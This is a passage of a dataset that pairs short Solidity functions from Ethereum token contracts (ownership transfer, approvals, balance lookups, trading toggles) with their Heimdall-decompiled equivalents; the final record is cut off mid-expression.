(address(store_d / 0x01)));\n    }"}
{"contract_address": "0xB997F52A0cF32b5120eD31BEAbaeF3Af6256cb77", "original_solidity_code": "function _setOcoAddr(address _OcO_addr) public onlyOwner  {  \\n            OcO_addr = _OcO_addr;\\n        }", "heimdall_decompiled_code": "function _setOcoAddr(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_h = (address(arg0) * 0x01) | (uint96(store_h));\n    }"}
{"contract_address": "0x7435b0C4566F7eDe8d922841290a9cc552e1b96b", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public payable {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0x311f785e0fcb5A7c8990cdBe114e59A787116705", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_t) {\n            if (store_t - ((store_t >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_t >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_t >> 0x01;\n                if (store_t) {\n                    if (store_t - ((store_t >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_t >> 0x01) {\n                            if (0x1f < (store_t >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_t >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xF4DEF1F694801EaBF6f4B4b8b0209E617Bb224e8", "original_solidity_code": "function manualswap() external {\r\n        require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress);\r\n        uint256 contractBalance = balanceOf(address(this));\r\n        swapTokensForEth(contractBalance);\r\n    }", "heimdall_decompiled_code": "function manualswap() public view {\n        require(address(msg.sender) == (address(store_p)));\n        require(address(msg.sender) == (address(store_q)));\n        address var_a = address(this);\n        var_b = 0x02;\n        require(!(storage_map_l[var_a] > store_m), \"Amount must be less than total reflections\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x2a;\n        var_f = 0x416d6f756e74206d757374206265206c657373207468616e20746f74616c2072;\n        var_g = 0x65666c656374696f6e7300000000000000000000000000000000000000000000;\n        uint256 var_h = 0x40 + var_h;\n        var_c = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x0de0b6b3a7640000, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        uint256 var_g = var_h.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        if (0x0de0b6b3a7640000) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_n = 0x12;\n            if (!store_m < (store_m / 0x0de0b6b3a7640000)) {\n            }\n        }\n    }"}
{"contract_address": "0x15C20cF168b7A84E9C56ADbf233b80Fc40090e7a", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0) - 0, \"Ownable: new owner is the zero address\");\n        owner = (address(arg0) * 0x01) | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x26;\n        var_e = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_f = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x7A78ca246a44065Bfc493a27f2C2A21B766dCA73", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x05f5e100) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x05f5e100;\n                if (0x09) {\n                    if ((0x01 == 0x01) | !0x05f5e100) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x05f5e100;\n                        if (0x09) {\n                            if ((0x01 == 0x01) | !0x05f5e100) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x05f5e100;\n                                emit MaxTxAmountUpdated(0x05f5e100);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                    if (!0x09 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0x01) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x0F92AD5f9f111618AAE7F963c44B862A3e24f48c", "original_solidity_code": "function approve(address spender, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\\n     * allowance mechanism. `amount` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer}", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_d[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = this.code[2271:2305];\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = this.code[2420:2456];\n    }"}
{"contract_address": "0xC0BA94337896c443b7728Dce84B0A750e290fbFd", "original_solidity_code": "function enableTrading() public onlyOwner {\r\n        TradingOpen = true;\r\n                                            \r\n    }", "heimdall_decompiled_code": "function enableTrading() public {\n        require(address(getOwner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        pair = (0x01 * 0x010000000000000000000000000000000000000000) | (uint248(pair));\n    }"}
{"contract_address": "0x3e628c6678825195453B33f713147B8fb641248b", "original_solidity_code": "function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_w) {\n            if (store_w - ((store_w >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_w >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_w >> 0x01;\n                if (store_w) {\n                    if (store_w - ((store_w >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_w >> 0x01) {\n                            if (0x1f < (store_w >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_c[var_a];\n                                if ((0x20 + var_c) + (store_w >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xeE4121EC610aD03ad4b4b4151ccFB6999022Df86", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\\r\\n        return _balances[account];\\r\\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xf7A80453F5BB234Bbfa9f6596Ef94cE42D7055EF", "original_solidity_code": "function getBalance() public view returns (uint256) {\\n        return address(this).balance; //Return the contract balance\\n    }", "heimdall_decompiled_code": "function getBalance() public view returns (uint256) {\n        uint256 var_a = address(this).balance;\n        return address(this).balance;\n    }"}
{"contract_address": "0x04Ac04832dFeF1DFa133B242724D0a154C4a78Cb", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        emit OwnershipTransferred(_owner, address(0));\\n        _owner = address(0);\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x90bd0470eeFf15E5A6AC0D7221A4FFB0Eb6C690A", "original_solidity_code": "function renounceownership() public virtual onlyowner {\r\n        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));\r\n        _owner = address(0x000000000000000000000000000000000000dEaD);\r\n    }", "heimdall_decompiled_code": "function renounceownership() public payable {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit ownershipTransferred(address(owner), 0xdead);\n        owner = 0xdead | (uint96(owner));\n    }"}
{"contract_address": "0xEea644890623CdfBD648027cbf819A3C8e48C924", "original_solidity_code": "function approve(address spender, uint256 amount)\r\n        external\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"BaseRfiToken: approve to the zero address\");\n        require(address(arg0), \"BaseRfiToken: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x1a;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x29;\n        var_f = 0x42617365526669546f6b656e3a20617070726f766520746f20746865207a6572;\n        var_g = 0x6f20616464726573730000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x2b;\n        var_f = 0x42617365526669546f6b656e3a20617070726f76652066726f6d20746865207a;\n        var_g = 0x65726f2061646472657373000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x84B55c2CCbA3Fb23FF2648Ba8b740fC91547E6df", "original_solidity_code": "function approve(address spender, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_e[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x6f87c7FAc982eB280d81865547aB31fD209b1637", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\\n        return _balances[account];\\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_e[var_a];\n        return storage_map_e[var_a];\n    }"}
{"contract_address": "0xbC9683EE9525c4525e7e0dCFfe8eeD1447fd4287", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(address(arg0) == 0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0) * 0x01) | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x26;\n        var_e = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_f = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x7ccFBc00423e429844f344aA62D726E3C0DCbfCA", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public payable {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0xc0d5852bF2E95089EcEe1Fb3D3641A7e60073D44", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {return _symbol;}", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_u) {\n            if (store_u - ((store_u >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_u >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_u >> 0x01;\n                if (store_u) {\n                    if (store_u - ((store_u >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_u >> 0x01) {\n                            if (0x1f < (store_u >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_u >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x050355a5eA2d1590C7FBB1aA354b4f698d221b37", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(address(arg0) == 0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0) * 0x01) | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x26;\n        var_e = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_f = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xC246C2C0B1DEBBFF9370a5A2f0BD35c17DE5b373", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x7A78ca246a44065Bfc493a27f2C2A21B766dCA73", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xE6e64A82283755f0865602b007A4eB7FFFf055De", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_d = arg1 + storage_map_b[var_a];\n        emit Approval(address(msg.sender), address(arg0), arg1 + storage_map_b[var_a]);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x926911A3809B6e15FA9dab87A4beAE0E83361C75", "original_solidity_code": "function isExcludedFromFees(address account) public view returns(bool) {\r\n        return _isExcludedFromFees[account];\r\n    }", "heimdall_decompiled_code": "function isExcludedFromFees(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x1c;\n        address var_c = !(!bytes1(storage_map_b[var_a]));\n        return !(!bytes1(storage_map_b[var_a]));\n    }"}
{"contract_address": "0xf7A80453F5BB234Bbfa9f6596Ef94cE42D7055EF", "original_solidity_code": "function getTokenInfo(uint256 _pid) public view returns (address) {\\n        TokenInfo storage tokens = AllowedCrypto[_pid];\\n        IERC20 paytoken;\\n        paytoken = tokens.paytoken;\\n        return address(paytoken); //Return the contract balance\\n    }", "heimdall_decompiled_code": "function getTokenInfo(uint256 arg0) public view returns (address) {\n        require(arg0 < store_e);\n        var_a = 0x0b;\n        uint256 var_b = address(storage_map_f[arg0 * 0x02]);\n        return address(storage_map_f[arg0 * 0x02]);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n    }"}
{"contract_address": "0x00BCB434254797479bade33e1eF0aEBDB3F27089", "original_solidity_code": "function balanceOf(\r\n        address account\r\n    ) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xF36754d67a8C99e1D683915ED5A6E55aB259ba79", "original_solidity_code": "function set_New_Router_and_Make_Pair(address newRouter) public onlyOwner() {\r\n        IUniswapV2Router02 _newPCSRouter = IUniswapV2Router02(newRouter);\r\n        uniswapV2Pair = IUniswapV2Factory(_newPCSRouter.factory()).createPair(address(this), _newPCSRouter.WETH());\r\n        uniswapV2Router = _newPCSRouter;\r\n    }", "heimdall_decompiled_code": "function set_New_Router_and_Make_Pair(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(arg0).factory(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_f == (address(var_f)));\n        var_g = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(arg0).WETH(var_d); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_f == (address(var_f)));\n        var_h = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        address var_i = address(var_f);\n        (bool success, bytes memory ret0) = address(var_f).{ value: 0 ether }Unresolved_c9c65396(var_e); // call\n    }"}
{"contract_address": "0xF36754d67a8C99e1D683915ED5A6E55aB259ba79", "original_solidity_code": "function excludeFromFee(address account) public onlyOwner {\r\n        _isExcludedFromFee[account] = true;\r\n    }", "heimdall_decompiled_code": "function excludeFromFee(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        address var_f = address(arg0);\n        var_g = 0x03;\n        storage_map_p[var_f] = (0x01 * 0x01) | (uint248(storage_map_p[var_f]));\n    }"}
{"contract_address": "0xaEAD18A6f788fb7460aDA9fDFf4C4Cd6Ba72dDBE", "original_solidity_code": "function explicitOwnershipsOf(uint256[] memory tokenIds) external view returns (TokenOwnership[] memory);\\n\\n    /**\\n     * @dev Returns an array of token IDs owned by `owner`,\\n     * in the range [`start`, `stop`)\\n     * (i.e. `start <= tokenId < stop`).\\n     *\\n     * This function allows for tokens to be queried if the collection\\n     * grows too big for a single call of {ERC721AQueryable-tokensOfOwner}", "heimdall_decompiled_code": "function explicitOwnershipsOf(uint256[] arg0) public view returns (bytes memory) {\n        require(!arg0 > 0xffffffffffffffff);\n        require(!(arg0) > 0xffffffffffffffff);\n        uint256 var_a = (arg0);\n        uint256 var_b = 0x20 + (var_b + (arg0 << 0x05));\n        if (!(arg0) << 0x05) {\n            var_b = var_b + 0x80;\n            uint256 var_c = 0;\n            uint256 var_d = 0;\n            uint256 var_e = 0;\n            uint256 var_f = 0;\n            if (((0x20 + (arg0)) + (arg0 << 0x05) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0) < 0x01) {\n                if (!((0x20 + (arg0)) + (arg0 << 0x05) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0) < totalSupply) {\n                    uint256 var_g = ((0x20 + (arg0)) + (arg0 << 0x05) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0);\n                    var_h = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n                    if (storage_map_o[var_g]) {\n                        var_b = var_b + 0x80;\n                        uint256 var_i = 0;\n                        uint256 var_j = 0;\n                        uint256 var_k = 0;\n                        uint256 var_l = 0;\n                        var_g = ((0x20 + (arg0)) + (arg0 << 0x05) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0);\n                        var_h = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n                        var_b = var_b + 0x80;\n                        uint256 var_m = 0;\n                        uint256 var_n = 0;\n                        uint256 var_o = 0;\n                        uint256 var_p = 0;\n                        var_m = address(storage_map_o[var_g]);\n                        var_n = uint64(storage_map_o[var_g] >> 0xa0);\n                        var_o = !(!bytes1(storage_map_o[var_g]));\n                        var_p = storage_map_o[var_g] >> 0xe8;\n                        var_a = var_b;\n                        require(!(arg0) << 0x05);\n                        var_q = 0x20;\n                        uint256 var_r = var_b.length;\n                        return abi.encodePacked(0x20, var_b.length);\n                        var_g = ((0x20 + (arg0)) + (arg0 << 0x05) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n                        var_h = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n                        require(((0x20 + (arg0)) + (arg0 << 0x05) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0) < 0x01);\n                        var_g = (((0x20 + (arg0)) + (arg0 << 0x05) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe0) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) + 